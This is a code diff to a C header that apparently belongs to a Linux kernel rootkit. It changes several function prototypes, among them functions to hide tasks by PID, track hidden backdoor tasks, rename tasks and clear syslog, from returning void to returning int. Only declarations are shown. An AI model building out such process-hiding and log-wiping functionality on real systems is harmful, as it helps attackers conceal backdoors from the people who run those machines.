@@ -100,7 +100,7 @@ void kv_crypto_engine_deinit(void);
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
-void sys_do_syslog_clear(void);
+int sys_do_syslog_clear(void);
 char *sys_get_ttyfile(void);
 char *sys_get_sslfile(void);
 
@@ -108,17 +108,17 @@ char *sys_get_sslfile(void);
 bool kv_pid_init(struct kernel_syscalls *fn_addr);
 bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid);
 bool kv_find_hidden_task(struct task_struct *);
-void kv_hide_task_by_pid(pid_t, __be32, Operation);
+int kv_hide_task_by_pid(pid_t, __be32, Operation);
 void kv_unhide_task_by_pid_exit_group(pid_t pid);
 bool kv_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct *, void *),
 				      void *);
 bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *);
 void kv_reload_hidden_task(struct task_struct *task);
 void kv_pid_cleanup(void);
-void kv_rename_task(pid_t, const char *);
+int kv_rename_task(pid_t, const char *);
 void kv_show_saved_tasks(void);
 void kv_show_all_tasks(void);
-void kv_send_signal(int, struct task_struct *);
+int kv_send_signal(int, struct task_struct *);
 
 /** syscall,function addresses */
 struct kernel_syscalls *kv_kall_load_addr(void);
